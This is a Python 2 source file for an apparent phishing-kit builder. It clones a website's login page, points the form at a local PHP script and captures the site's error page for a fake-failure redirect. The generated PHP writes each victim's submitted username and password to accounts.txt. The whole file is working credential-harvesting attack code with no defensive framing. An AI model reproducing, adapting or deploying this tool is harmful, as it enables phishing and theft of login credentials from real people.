import re
import cookielib
import mechanize
from bs4 import BeautifulSoup as bs

class Create(object):
 def __init__(self):
  self.browser = None
  self.username = None
  self.password = None
  self.loginphp = 'login.php' # write post info
  self.fakeLogin = '256.256' # force page to throw login error (random number)
  self.phpsrc = '''<?php
  $data = sprintf("Account Information\\n[
  Login: %s
  Password: %s\\n]
  \\n",$_POST['{}'], $_POST['{}']);

  $file = "accounts.txt";
  file_put_contents($file, $data, FILE_APPEND);\n?>\n
<meta http-equiv="refresh" content="0; url=error.html"/>'''

 def exit(self,page):
  exit('[-] Unable to locate a login form on: {}'.format(page))

 def createBrowser(self):
  br = mechanize.Browser()
  br.set_handle_equiv(True)
  br.set_handle_referer(True)
  br.set_handle_robots(False)
  br.set_cookiejar(cookielib.LWPCookieJar())
  br.addheaders=[('User-agent',self.useragent())]
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
  self.browser = br

 def useragent(self):
  return 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko'

 def extract(self,line,username=True):
  name = line[13:-3] if username else line[17:-3]
  return name

 def getFields(self):
  for form in self.browser.forms():
   for line in str(form).split():
    if '<TextControl(' in line:
     self.username = self.extract(line)
    if '<PasswordControl(' in line:
     self.password = self.extract(line,False)
     return

 def replace(self,html):
  # method 1
  src = bs(html,'lxml')
  action = src.find('form').get('action')
  if action.strip():
   newSrc = re.sub(action,self.loginphp,html)
   _src = bs(newSrc,'lxml')
   if _src.find('form').get('action') != action:
    return newSrc

  # method 2
  html = bs(html,'html.parser')
  html.find('form').attrs['action'] = self.loginphp
  return str(html)

 def createHtml(self,src,index=True):
  src = self.replace(src)
  src = re.sub(self.fakeLogin,'',src)
  filename = 'index.html' if index else 'error.html'
  with open(filename,'w') as fwrite:fwrite.write(src)

 def html(self,page,rec=5):
  self.createBrowser()

  try:
   html = self.browser.open(page)
   self.getFields()

   if any([not self.username,not self.password]):
    self.exit(page)
   self.createHtml(html.read()) # index.html

   # error.html
   self.browser.select_form(nr=0)
   self.browser[self.username] = self.fakeLogin
   self.createHtml(self.browser.submit().read(),False)

  except KeyboardInterrupt:
   exit('\n[-] Interrupted')
  except:
   if rec:self.html(page,rec-1)
   else:self.exit(page)

  print '[ Fields Found ]\nUsername: {}\nPassword: {}'.\
  format(self.username,self.password)

 def php(self):
  with open('{}'.format(self.loginphp),'w') as phpfile:
   phpfile.write(self.phpsrc.format(self.username,self.password))
